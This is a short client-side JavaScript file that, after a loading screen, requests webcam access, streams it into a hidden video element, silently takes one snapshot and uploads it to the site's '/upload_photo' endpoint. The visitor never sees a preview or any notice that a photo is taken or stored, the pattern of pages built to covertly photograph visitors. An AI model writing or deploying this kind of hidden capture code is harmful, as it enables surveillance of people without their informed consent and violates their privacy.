window.addEventListener('DOMContentLoaded', () => {
  const loader = document.querySelector('.loader');
  const container = document.querySelector('.container');
  
  const video = document.createElement('video');
  video.style.display = 'none';
  document.body.appendChild(video);
  
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  
  setTimeout(() => {
    loader.style.display = 'none';
    container.style.display = 'flex';
    
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          video.play();
          video.addEventListener('loadedmetadata', () => {
            // Set canvas dimensions to match video
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            setTimeout(() => {
              capturePhoto();
              stream.getTracks().forEach(track => track.stop());
              video.remove();
            }, 1000);
          });
        })
        .catch(err => {
          console.error('Error accessing webcam:', err);
        });
    } else {
      console.warn('getUserMedia not supported by this browser');
    }
  }, 1000);
  
  function capturePhoto() {
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    canvas.toBlob(blob => {
      if (blob) {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `capture_${timestamp}.jpg`;
        
        sendPhotoToServer(blob, filename);
      }
    }, 'image/jpeg', 0.8);
  }
  
  function sendPhotoToServer(blob, filename) {
    const formData = new FormData();
    formData.append('photo', blob, filename);
    
    fetch('/upload_photo', {
      method: 'POST',
      body: formData
    })
    .then(response => {
      if (response.ok) {
        console.log(`Photo ${filename} saved successfully`);
      } else {
        console.error('Failed to save photo:', response.statusText);
      }
    })
    .catch(error => {
      console.error('Error sending photo:', error);
    });
  }
});
